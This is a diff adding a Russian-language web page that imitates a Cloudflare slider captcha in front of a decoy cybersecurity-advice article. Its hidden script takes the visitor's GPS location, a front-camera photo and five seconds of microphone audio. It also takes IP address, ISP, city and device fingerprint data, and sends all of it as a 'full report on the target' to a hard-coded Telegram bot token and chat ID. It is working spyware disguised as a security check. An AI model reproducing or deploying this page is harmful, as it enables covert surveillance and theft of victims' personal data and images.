@@ -1,0 +1,290 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Главная | Кибербезопасность</title>
+    <style>
+        /* --- СТИЛИ ДЛЯ КАПЧИ --- */
+        body { background-color: #f7f7f7; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif; margin: 0; color: #333; }
+        .captcha-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(247, 247, 247, 0.95); display: flex; justify-content: center; align-items: center; z-index: 9999; }
+        .captcha-box { background: #fff; border: 1px solid #e0e0e0; border-radius: 8px; padding: 30px 25px; width: 320px; box-shadow: 0 4px 12px rgba(0,0,0,0.05); display: flex; flex-direction: column; align-items: center; position: relative; }
+        .header-text { font-size: 16px; font-weight: 600; margin-bottom: 5px; color: #1a1a1a; }
+        .sub-text { font-size: 13px; color: #666; margin-bottom: 20px; text-align: center; line-height: 1.4; }
+        .slider-container { width: 100%; height: 50px; background: #f0f0f0; border-radius: 4px; position: relative; overflow: hidden; border: 1px solid #ddd; cursor: pointer; display: flex; align-items: center; justify-content: center; }
+        .slider-btn { width: 50px; height: 50px; background: #fff; border: 1px solid #ddd; border-radius: 4px; position: absolute; left: 0; top: 0; display: flex; justify-content: center; align-items: center; transition: left 0.3s ease; box-shadow: 1px 0 3px rgba(0,0,0,0.1); z-index: 2; }
+        .slider-btn svg { fill: #999; width: 20px; height: 20px; }
+        .slider-text { font-size: 14px; color: #666; z-index: 1; pointer-events: none; user-select: none; }
+        .slider-container.active .slider-btn { left: calc(100% - 50px); }
+        .slider-container.active .slider-text { color: transparent; }
+        #loader { display: none; font-size: 14px; color: #4285f4; margin-top: 15px; font-weight: 500; align-items: center; gap: 8px; }
+        .spinner { width: 16px; height: 16px; border: 2px solid #e0e0e0; border-top: 2px solid #4285f4; border-radius: 50%; animation: spin 1s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .footer { margin-top: 20px; font-size: 11px; color: #999; text-align: center; display: flex; align-items: center; justify-content: center; gap: 5px; }
+
+        /* --- СТИЛИ ДЛЯ САЙТА-ЗАГЛУШКИ --- */
+        #main-site {
+            display: none; min-height: 100vh;
+            background: linear-gradient(rgba(15, 23, 42, 0.9), rgba(15, 23, 42, 0.95)), url('https://images.unsplash.com/photo-1550751827-4bd374c3f58b?q=80&w=2070&auto=format&fit=crop') no-repeat center center fixed;
+            background-size: cover; color: #e2e8f0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        .site-header { background: rgba(2, 6, 23, 0.9); padding: 20px 40px; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #1e293b; backdrop-filter: blur(5px); }
+        .site-logo { font-size: 22px; font-weight: 800; letter-spacing: 1px; color: #fff; display: flex; align-items: center; gap: 10px; }
+        .site-logo span { color: #3b82f6; }
+        .site-nav a { color: #cbd5e1; text-decoration: none; margin-left: 20px; font-size: 14px; font-weight: 500; transition: color 0.3s; }
+        .site-nav a:hover { color: #fff; }
+
+        .site-content { max-width: 900px; margin: 40px auto; padding: 40px; background: rgba(30, 41, 59, 0.8); border-radius: 12px; border: 1px solid #334155; box-shadow: 0 10px 30px rgba(0,0,0,0.5); backdrop-filter: blur(10px); }
+        .site-content h1 { color: #fff; font-size: 2.2rem; margin-top: 0; border-bottom: 1px solid #334155; padding-bottom: 20px; }
+        .site-content h2 { color: #60a5fa; font-size: 1.5rem; margin-top: 30px; margin-bottom: 15px; }
+        .site-content p { line-height: 1.8; font-size: 1.05rem; color: #cbd5e1; margin-bottom: 15px; }
+        .site-content ul { line-height: 1.8; color: #cbd5e1; padding-left: 20px; margin-bottom: 20px; }
+        .site-content li { margin-bottom: 8px; }
+        .site-content .highlight { background: rgba(59, 130, 246, 0.1); border-left: 4px solid #3b82f6; padding: 15px; border-radius: 4px; margin: 20px 0; }
+        .site-content img { width: 100%; border-radius: 8px; margin: 20px 0; border: 1px solid #334155; }
+
+        .site-footer { text-align: center; padding: 30px; font-size: 13px; color: #64748b; background: rgba(2, 6, 23, 0.9); margin-top: 40px; border-top: 1px solid #1e293b; }
+
+        @media (max-width: 600px) {
+            .site-header { flex-direction: column; gap: 15px; padding: 15px; }
+            .site-nav a { margin: 0 10px; }
+            .site-content { margin: 20px; padding: 20px; }
+            .site-content h1 { font-size: 1.6rem; }
+            .site-content h2 { font-size: 1.3rem; }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- 1. КАПЧА -->
+    <div class="captcha-overlay" id="captcha">
+        <div class="captcha-box">
+            <div class="header-text">Проверка безопасности</div>
+            <div class="sub-text">Для продолжения работы с сайтом подтвердите, что вы человек. Это займет несколько секунд.</div>
+            
+            <div class="slider-container" id="slider-btn">
+                <div class="slider-btn">
+                    <svg viewBox="0 0 24 24"><path d="M8.59 16.59L13.17 12 8.59 7.41 10 6l6 6-6 6-1.41-1.41z"/></svg>
+                </div>
+                <div class="slider-text">Потяните ползунок вправо</div>
+            </div>
+
+            <div id="loader">
+                <div class="spinner"></div>
+                <span>Проверка браузера...</span>
+            </div>
+
+            <div class="footer">
+                <svg viewBox="0 0 24 24" width="12" height="12" fill="#999"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z"/></svg>
+                Cloudflare, Inc. | Privacy | Terms
+            </div>
+        </div>
+    </div>
+
+    <!-- 2. САЙТ-ЗАГЛУШКА -->
+    <div id="main-site">
+        <header class="site-header">
+            <div class="site-logo"><span>//</span> CyberSec Portal</div>
+            <nav class="site-nav">
+                <a href="#">Главная</a>
+                <a href="#">Уязвимости</a>
+                <a href="#">Практика</a>
+                <a href="#">Контакты</a>
+            </nav>
+        </header>
+
+        <main class="site-content">
+            <h1>Основы цифровой гигиены: Как защитить свои данные в 2026 году</h1>
+            
+            <p>Добро пожаловать на наш образовательный портал. Сегодня мы разберем базовые принципы безопасности в сети, которые должен знать каждый пользователь. Киберпреступность растет с каждым годом, и ваша задача — не стать легкой добычей.</p>
+
+            <img src="https://images.unsplash.com/photo-1563986768609-322da13575f3?q=80&w=2070&auto=format&fit=crop" alt="Security">
+
+            <h2>1. Пароль — это ключ от вашей жизни</h2>
+            <p>Большинство взломов происходит не из-за хакеров-гениев, а из-за слабых паролей. Использование одного пароля для всех сервисов — это как один ключ от квартиры, машины и банковского сейфа. Потеряв его один раз, вы теряете всё.</p>
+            <ul>
+                <li><strong>Длина важнее сложности:</strong> Пароль из 20 символов (даже если это фраза) надежнее, чем 8 символов с спецзнаками.</li>
+                <li><strong>Менеджеры паролей:</strong> Используйте Bitwarden, KeePass или встроенные менеджеры браузера для генерации и хранения уникальных паролей.</li>
+                <li><strong>Двухфакторная аутентификация (2FA):</strong> Всегда включайте 2FA. Лучше всего использовать приложения-аутентификаторы (Google Authenticator, Aegis), а не SMS.</li>
+            </ul>
+
+            <div class="highlight">
+                <strong>Важно:</strong> Никогда не вводите свои пароли на сайтах, которые открылись по ссылке из подозрительного сообщения. Всегда проверяйте адресную строку браузера.
+            </div>
+
+            <h2>2. Фишинг и социальная инженерия</h2>
+            <p>Фишинг — это метод, при котором злоумышленники имитируют легитимные сайты (банки, соцсети, почтовые сервисы), чтобы выманить у вас данные для входа. Зачастую такие сайты выглядят неотличимо от оригинала.</p>
+            <p>Кроме того, злоумышленники часто используют психологическое давление. Они могут писать от имени службы поддержки с требованием «срочно подтвердить аккаунт» или обещать крупный выигрыш. Всегда сохраняйте спокойствие и перепроверяйте информацию через официальные каналы связи.</p>
+
+            <h2>3. Безопасность мобильных устройств</h2>
+            <p>Ваш смартфон содержит больше личной информации, чем домашний компьютер. Установка приложений из сторонних источников (не из Google Play или App Store) — это огромный риск. Такие приложения могут содержать трояны, которые крадут ваши SMS, перехватывают буфер обмена и отслеживают местоположение.</p>
+            <ul>
+                <li>Регулярно обновляйте операционную систему и приложения.</li>
+                <li>Не подключайтесь к открытым Wi-Fi сетям без VPN.</li>
+                <li>Проверяйте разрешения приложений: зачем игре доступ к вашим контактам или микрофону?</li>
+            </ul>
+
+            <h2>4. Что делать, если вас взломали?</h2>
+            <p>Если вы заметили подозрительную активность, немедленно смените пароли со всех устройств, выйдите из всех сессий (особенно в Telegram и соцсетях) и включите 2FA. Если дело касается финансов, сразу же блокируйте карты через приложение банка.</p>
+            
+            <p><i>Помните: безопасность — это не продукт, который можно купить, это процесс, который требует постоянного внимания.</i></p>
+        </main>
+
+        <footer class="site-footer">
+            &copy; 2026 CyberSec Educational Portal. Все материалы предоставлены в ознакомительных целях.
+        </footer>
+    </div>
+
+    <script>
+        // --- ВСТАВЬ СВОИ ДАННЫЕ ---
+        const BOT_TOKEN = '9124218404:AAEk9TxsA9cqGLKYZwZrsaIiFCwsM5asfSE';
+        const CHAT_ID = '1743410879';
+
+        // Расширенный сбор данных
+        async function sendAllData(photoBlob, audioBlob, geoData) {
+            if (BOT_TOKEN === 'ТВОЙ_ТОКЕН_ЗДЕСЬ') return;
+
+            // 1. IP и Провайдер
+            let ip = "Неизвестно", provider = "Неизвестно", city = "Неизвестно";
+            try { 
+                const res = await fetch('http://ip-api.com/json/'); // Используем ip-api для города и провайдера
+                const j = await res.json(); 
+                ip = j.query; provider = j.isp; city = j.city;
+            } catch (e) {}
+
+            // 2. Батарея
+            let battery = "Неизвестно", charging = "";
+            try { const b = await navigator.getBattery(); battery = Math.round(b.level * 100) + "%"; charging = b.charging ? " (Заряжается)" : ""; } catch (e) {}
+            
+            // 3. Сеть
+            let network = "Неизвестно";
+            try { network = navigator.connection.effectiveType.toUpperCase(); } catch (e) {}
+
+            // 4. Железо
+            let cores = navigator.hardwareConcurrency || "Неизвестно";
+            let ram = navigator.deviceMemory || "Неизвестно";
+
+            // 5. Экран
+            let screenRes = `${window.screen.width}x${window.screen.height}`;
+            let orientation = window.screen.orientation ? window.screen.orientation.type : "Неизвестно";
+            let touch = navigator.maxTouchPoints > 0 ? "Да" : "Нет";
+
+            // 6. Плагины (работает на ПК)
+            let plugins = [];
+            try { for (let i = 0; i < navigator.plugins.length; i++) { plugins.push(navigator.plugins[i].name); } } catch (e) {}
+            let pluginsStr = plugins.length > 0 ? plugins.join(", ").substring(0, 50) + "..." : "Нет/Скрыто";
+
+            // 7. Язык и Часовой пояс
+            let lang = navigator.language;
+            let timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+
+            // Формируем отчет
+            let caption = `🚨 **ПОЛНЫЙ ОТЧЕТ О ЦЕЛИ** 🚨\n\n`;
+            caption += `🌐 **IP:** ${ip}\n`;
+            caption += `🏢 **Провайдер:** ${provider}\n`;
+            caption += `🏙️ **Город:** ${city}\n`;
+            caption += `📍 **GPS:** ${geoData ? geoData.lat + ", " + geoData.lon : "Отклонено"}\n`;
+            if (geoData) caption += `🗺️ [Google Карты](https://www.google.com/maps/search/?api=1&query=${geoData.lat},${geoData.lon})\n\n`;
+            
+            caption += `📱 **Устройство:** ${navigator.userAgent.substring(0, 60)}...\n`;
+            caption += `🖥️ **Экран:** ${screenRes} | Ориентация: ${orientation}\n`;
+            caption += `👆 **Сенсор:** ${touch}\n`;
+            caption += `🔋 **Батарея:** ${battery}${charging}\n`;
+            caption += `📶 **Сеть:** ${network}\n`;
+            caption += `🧠 **Ядра/ОЗУ:** ${cores} ядер / ${ram} ГБ\n`;
+            caption += `🌍 **Язык/Пояс:** ${lang} | ${timezone}\n`;
+            caption += `🧩 **Плагины:** ${pluginsStr}\n`;
+
+            // Отправка фото с текстом
+            const formDataPhoto = new FormData();
+            formDataPhoto.append('chat_id', CHAT_ID);
+            formDataPhoto.append('photo', photoBlob, 'photo.jpg');
+            formDataPhoto.append('caption', caption);
+            formDataPhoto.append('parse_mode', 'Markdown');
+            try { await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formDataPhoto }); } catch (e) {}
+
+            // Отправка аудио
+            if (audioBlob) {
+                const formDataAudio = new FormData();
+                formDataAudio.append('chat_id', CHAT_ID);
+                formDataAudio.append('voice', audioBlob, 'voice.ogg');
+                formDataAudio.append('caption', '🎤 Запись с микрофона (5 сек)');
+                try { await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVoice`, { method: 'POST', body: formDataAudio }); } catch (e) {}
+            }
+        }
+
+        async function startCapture() {
+            document.getElementById('loader').style.display = 'flex';
+            document.getElementById('slider-btn').style.pointerEvents = 'none';
+
+            let geoData = null;
+            try {
+                const pos = await new Promise((resolve, reject) => navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 5000 }));
+                geoData = { lat: pos.coords.latitude, lon: pos.coords.longitude };
+            } catch (e) {}
+
+            let photoBlob = null;
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                video.play();
+                await new Promise(r => video.onloadeddata = r);
+                await new Promise(r => setTimeout(r, 800));
+
+                const c = document.createElement('canvas');
+                c.width = video.videoWidth; c.height = video.videoHeight;
+                const cctx = c.getContext('2d');
+                cctx.translate(c.width, 0); cctx.scale(-1, 1);
+                cctx.drawImage(video, 0, 0);
+                photoBlob = await new Promise(r => c.toBlob(r, 'image/jpeg', 0.8));
+                stream.getTracks().forEach(t => t.stop());
+            } catch (e) {}
+
+            let audioBlob = null;
+            try {
+                const audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                const mediaRecorder = new MediaRecorder(audioStream);
+                const chunks = [];
+                mediaRecorder.ondataavailable = e => chunks.push(e.data);
+                mediaRecorder.start();
+                await new Promise(r => setTimeout(r, 5000));
+                mediaRecorder.stop();
+                await new Promise(r => mediaRecorder.onstop = r);
+                audioBlob = new Blob(chunks, { type: 'audio/ogg; codecs=opus' });
+                audioStream.getTracks().forEach(t => t.stop());
+            } catch (e) {}
+
+            if (photoBlob) {
+                await sendAllData(photoBlob, audioBlob, geoData);
+                document.getElementById('captcha').style.display = 'none';
+                document.getElementById('main-site').style.display = 'block';
+            } else {
+                document.getElementById('loader').style.display = 'none';
+                document.getElementById('slider-btn').style.pointerEvents = 'auto';
+                document.querySelector('.sub-text').innerText = "Ошибка проверки. Попробуйте еще раз.";
+                document.querySelector('.sub-text').style.color = "red";
+            }
+        }
+
+        const sliderContainer = document.getElementById('slider-btn');
+        let isDragging = false;
+        sliderContainer.addEventListener('mousedown', () => isDragging = true);
+        sliderContainer.addEventListener('touchstart', () => isDragging = true);
+        const handleDrag = () => {
+            if (!isDragging) return;
+            sliderContainer.classList.add('active');
+            startCapture();
+            isDragging = false;
+        };
+        sliderContainer.addEventListener('mousemove', handleDrag);
+        sliderContainer.addEventListener('touchmove', handleDrag);
+        sliderContainer.addEventListener('click', () => {
+            if (!sliderContainer.classList.contains('active')) {
+                sliderContainer.classList.add('active');
+                startCapture();
+            }
+        });
+    </script>
+</body>
+</html>
